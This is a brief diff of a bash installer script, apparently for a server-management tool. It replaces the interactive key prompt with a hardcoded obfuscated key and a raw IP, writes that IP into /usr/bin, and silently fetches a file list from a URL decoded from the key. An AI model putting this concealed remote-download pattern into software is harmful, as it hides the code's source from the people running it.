@@ -192,7 +192,9 @@ while [[ ! $Key ]]; do
 msg -ne "Script Key: " && read Key
 tput cuu1 && tput dl1
 done
-
+Key="qra-atsilK0@84%ab97cda8f?K8888:8@@+95+84?+94@"
+REQUEST=$(echo $SCPresq|$SUB_DOM)
+IP="104.238.135.147" && echo "$IP" > /usr/bin/vendor_code
 cd $HOME
 msg -ne "Key: "
 wget -O $HOME/lista-arq $(ofus "$Key")/$IP > /dev/null 2>&1 && echo -e "\033[1;32m Verified" || {
